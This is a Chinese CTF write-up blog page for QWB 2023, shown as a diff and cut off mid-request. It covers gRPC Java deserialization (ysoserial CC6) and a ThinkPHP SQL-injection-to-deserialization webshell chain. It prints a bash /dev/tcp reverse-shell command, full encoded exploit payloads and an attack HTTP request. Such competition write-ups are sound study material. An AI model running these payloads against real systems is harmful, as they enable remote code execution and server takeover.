@@ -1,0 +1,1858 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>QWB 2023 Writeup - DumKiy's blog</title>
+
+<meta name="description" content="WEBhappygame题目提供了一个 gRPC 服务。gRPC 是一个由 Google 初始开发的高性能、开源的远程过程调用（RPC）框架。网上已有不少针对 gRPC 的安全研究：  【Black Hat Asia 2021系列分享】自动化挖掘 gRPC 网络接口漏洞  gRPC内存马研究与查杀 - 先知社区g...">
+<link rel="canonical" href="/ctf/2023/12/19/QWB-2023-writeup.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/Resources.html">Resources</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>QWB 2023 Writeup</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-12-19-QWB-2023-writeup.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="QWB 2023 Writeup"><div class="article__info clearfix">
+      <div class="right-col">
+         <ul class="menu"> <span style="font-size: 1.2em;">📂</span><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/categories.html?tag=CTF">CTF</a>
+            </li></ul>
+      </div>
+      <div class="right-col"><ul class="left-col menu"> <span style="font-size: 1.2em;">📌</span><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/tags.html?tag=thinkphp">thinkphp</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/tags.html?tag=php">php</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/tags.html?tag=spring">spring</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/tags.html?tag=qwb">qwb</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/tags.html?tag=pyjail">pyjail</a>
+            </li></ul></div><ul class="left-col menu"><li><i class="far fa-calendar-alt"></i> <span>Dec 19, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-12-19T18:29:48+08:00">
+    <meta itemprop="keywords" content="thinkphp,php,spring,qwb,pyjail"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231219213702.png" alt="20231219213702" /></p>
+
+<h1 id="web">WEB</h1>
+<h2 id="happygame">happygame</h2>
+<p>题目提供了一个 gRPC 服务。gRPC 是一个由 Google 初始开发的高性能、开源的远程过程调用（RPC）框架。网上已有不少针对 gRPC 的安全研究：</p>
+<ul>
+  <li><a href="https://paper.seebug.org/1616/#01">【Black Hat Asia 2021系列分享】自动化挖掘 gRPC 网络接口漏洞</a></li>
+  <li><a href="https://xz.aliyun.com/t/11985#toc-2">gRPC内存马研究与查杀 - 先知社区</a></li>
+</ul>
+
+<p>gRPC 框架如下所示：
+<img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231218193159.png" alt="20231218193159" /></p>
+
+<p>可见服务端由 Java 编写。</p>
+
+<p>针对 gRPC 服务端，我们可以使用 gRPCurl 来逐步枚举服务端提供的接口以及接口定义。下载链接：<a href="https://github.com/fullstorydev/grpcurl">fullstorydev/grpcurl: Like cURL, but for gRPC: Command-line tool for interacting with gRPC servers</a></p>
+
+<p>根据工具文档，我们可以使用 list 来枚举接口，例如：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 list
+grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 list helloworld.Greeter
+</code></pre></div></div>
+<p>使用 describe 来获取接口定义及参数信息:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 describe helloworld.Greeter.ProcessMsg
+</code></pre></div></div>
+<p>helloworld.Greeter.ProcessMsg 接口可以接收一个 serializeData，发包格式如下：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./grpcurl <span class="nt">-plaintext</span> <span class="nt">-d</span> <span class="s1">'{"serializeData":"xxxxx'</span> <span class="nt">-vv</span> 8.147.133.154:43668 helloworld.Greeter/ProcessMsg
+</code></pre></div></div>
+<p>可以猜测此处存在反序列化漏洞，并且发送数据之后，接口的报错信息会提示我们需要发送 base64 编码数据。</p>
+
+<p>测试 URLDNS 利用链时确认存在漏洞，然后利用 CC6 可以 getshell。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># bash -i &gt;&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1</span>
+<span class="c"># bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}</span>
+
+ysoserial CommonsCollections6 <span class="s1">'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'</span>  | <span class="nb">base64</span> <span class="nt">-w</span> 0
+</code></pre></div></div>
+
+<p>poc:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./grpcurl <span class="nt">-plaintext</span> <span class="nt">-d</span> <span class="s1">'{"serializeData":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AGFiYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNRFF1TWpJMUxqSXpPQzR4TVRBdk9UazVPU0F3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="}'</span> <span class="nt">-vv</span> 8.147.133.154:43668 helloworld.Greeter/ProcessMsg
+</code></pre></div></div>
+
+<h2 id="thinkshop">thinkshop</h2>
+<p>题目给出了一个基于 thinkphp 的 php 服务，模板 goods_edit.html 中存在 unserialize 操作，thinkphp 版本为 5.0.23，可以考虑利用反序列化写入 webshell。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;textarea</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"data"</span> <span class="na">name=</span><span class="s">"data"</span> <span class="na">rows=</span><span class="s">"3"</span> <span class="na">required</span><span class="nt">&gt;</span>{php}
+        
+        use app\index\model\Goods;$view=new Goods();echo $view-&gt;arrayToMarkdown(unserialize(base64_decode($goods['data'])));{/php}<span class="nt">&lt;/textarea&gt;</span>
+</code></pre></div></div>
+<p>编辑商品页面需要登陆 admin 才能访问，数据库中保存的 hash 是 123456 的 md5，但登录部分的代码故意写错，输入 1/123456 才能正常登录。</p>
+
+<p>通过 goods_edit.html 我们可以修改数据库中的 goods 表的 data 字段。但 saveGoods 函数会先将我们的输入进行序列化，然后再保存，最终写入的 payload 都会变成字符串，无法正常触发 thinkphp 利用链。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">saveGoods</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">markdownToArray</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])));</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>但 updatedata 函数存在 sql 注入，可以利用 SQL 注入将 payload 插入到 data 字段。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">updatedata</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$table</span><span class="p">,</span> <span class="nv">$id</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">())</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s1">'Error'</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"UPDATE </span><span class="nv">$table</span><span class="s2"> SET "</span><span class="p">;</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$sql</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"`</span><span class="nv">$key</span><span class="s2">` = unhex('"</span> <span class="mf">.</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"'), "</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="nv">$sql</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="s1">', '</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">" WHERE `id` = "</span> <span class="mf">.</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(),</span> <span class="nv">$sql</span><span class="p">);</span>
+
+
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>此外，题目在反序列化前还有一个校验操作：从数据库取出 data 时会判断是否以 YTo 开头：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">getGoodsById</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$select</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Select</span><span class="p">();</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$select</span><span class="o">-&gt;</span><span class="nf">select</span><span class="p">(</span><span class="s1">'goods'</span><span class="p">,</span> <span class="s1">'id'</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'data'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'data'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">"YTo"</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">(</span><span class="s2">"数据错误"</span> <span class="p">,</span> <span class="s1">'index/admin/goods_edit'</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>其实是要求反序列化出来一个数组，可以修改一下 phpggc，包一层数组后再生成 payload：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phpggc ThinkPHP/FW1 /var/www/html/ /mnt/share/project/CTF/QWB/thinkshop/shell.php <span class="nt">-b</span> <span class="nt">-u</span>
+</code></pre></div></div>
+<p>发送 payload：</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/public/index.php/index/admin/do_edit.html</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1629</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com/public/index.php/index/admin/goods_edit/id/1.html</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9kfk3dm38nq1p2tbm00p6toad7</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+id=1&amp;name`%3d"",`data`%3d"YToyOntpOjA7aToxO2k6MTtPOjEzOiJ0aGlua1xQcm9jZXNzIjozOntzOjI3OiIAdGhpbmtcUHJvY2VzcwBwcm9jZXNzUGlwZXMiO086Mjg6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEhhc01hbnkiOjU6e3M6ODoiACoAcXVlcnkiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo1OiJ3aGVyZSI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086Mjk6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI4OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGVkIjozOntzOjY6IgAqAHRhZyI7YjoxO3M6MTA6IgAqAG9wdGlvbnMiO2E6Mjp7czo2OiJleHBpcmUiO2k6MDtzOjY6InByZWZpeCI7czowOiIiO31zOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czo2OiIAKgB0YWciO2I6MDtzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjM2MDA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7czo0OiJwYXRoIjtzOjU4OiJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvIjt9fX19fXM6OToiACoAcGFyZW50IjtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6MTp7czoxOiJhIjtzOjE6IjEiO31zOjExOiIAKgBsb2NhbEtleSI7czoxOiJhIjtzOjg6IgAqAHBpdm90IjtOO3M6MTM6IgAqAGZvcmVpZ25LZXkiO3M6MzU6IkFBQVBEOXdhSEFnWlhaaGJDZ2tYMGRGVkZ0aFhTazdQejRLIjt9czoyMToiAHRoaW5rXFByb2Nlc3MAc3RhdHVzIjtpOjM7czozMzoiAHRoaW5rXFByb2Nlc3MAcHJvY2Vzc0luZm9ybWF0aW9uIjthOjE6e3M6NzoicnVubmluZyI7YjoxO319fQ%3D%3D"where`id`%3d1%23=1111&amp;price=&amp;on_sale_time=&amp;image=11111&amp;data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E